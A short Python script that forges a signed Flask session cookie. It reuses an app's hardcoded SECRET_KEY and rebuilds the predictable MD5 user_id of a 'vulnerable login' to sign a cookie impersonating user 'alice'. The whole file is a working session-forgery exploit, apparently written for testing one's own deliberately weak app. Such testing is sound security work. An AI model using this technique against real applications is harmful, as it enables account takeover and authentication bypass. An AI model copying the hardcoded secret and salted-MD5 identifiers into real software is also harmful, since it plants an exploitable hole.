# make_cookie.py
import hashlib
import os
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

# Mirror your app's settings
app = Flask(__name__)
app.config['SECRET_KEY'] = 'my_secret_key'

# Compute the same user_id your vulnerable login uses
MD5_ID = hashlib.md5(('alice' + 'static_salt').encode()).hexdigest()

# Ask Flask for the exact serializer it uses for sessions
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
cookie_value = serializer.dumps({'user_id': MD5_ID})
print(cookie_value)
